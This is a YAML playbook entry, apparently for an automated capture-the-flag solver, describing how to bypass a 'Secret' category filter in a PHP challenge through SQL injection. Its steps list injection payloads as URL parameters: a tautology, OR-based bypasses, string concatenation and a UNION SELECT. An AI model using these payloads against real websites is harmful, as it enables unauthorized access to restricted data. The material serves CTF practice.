name: php_sqli_category_filter_bypass
category: web
tags: [sqli, sql_injection, php, filter_bypass]
indicators:
  - "SQL query with string concatenation"
  - "Category parameter in WHERE clause"
  - "Filter removes 'Secret' category"
  - "Direct string interpolation in SQL"

tricks:
  - name: "Step 1: Identify SQL injection"
    when: "Found category parameter in SQL"
    how: "Test with SQL injection payload"
    payload: |
      ?category=test' OR '1'='1
      # If returns all posts, SQLi confirmed

  - name: "Step 2: Bypass Secret filter"
    when: "Secret category is filtered"
    how: "Use SQL injection to bypass filter"
    payload: |
      # Filter checks: if ($category == "Secret") $category = "";
      # Use SQLi to access anyway
      ?category=Secret' OR category='Secret' OR '1'='1
      ?category=' OR category='Secret' OR '1'='1

  - name: "Step 3: Alternative bypass"
    when: "First payload doesn't work"
    how: "Try different SQL injection techniques"
    payload: |
      # String concatenation bypass
      ?category=Se'||'cret
      # UNION injection
      ?category=' UNION SELECT * FROM posts WHERE category='Secret'--

  - name: "Step 4: Extract flag"
    when: "SQLi successful"
    how: "Look for flag in secret category posts"
    payload: |
      # Once secret posts are visible, flag should be in content
      # May need to read full post content
